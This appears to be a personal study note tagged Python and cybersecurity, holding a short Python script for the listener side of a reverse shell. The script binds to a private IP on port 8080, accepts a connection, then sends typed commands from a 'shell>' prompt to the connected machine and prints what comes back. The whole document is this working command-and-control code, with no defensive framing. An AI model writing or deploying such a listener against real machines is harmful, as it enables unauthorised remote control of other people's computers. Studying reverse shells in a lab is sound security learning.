Tags: [[Programming]] [[Python]] [[Cybersecurity]] #CyberSecurity #Programming

```Python
import socket

def connect ():
    s = socket.socket()
    s.bind(("10.0.100.31",8080))
    s.listen(1)
    conn, addr = s.accept()
    print('[+] we got a connection from', addr)

    while True:
        command = input("shell> ")
        if 'terminate' in command:
            conn.send('terminae'.encode())
            conn.close()
            break
        else:
            conn.send(command.encode())
            print(conn.recv(1024).decode())


def main():
    connect()

main()

```
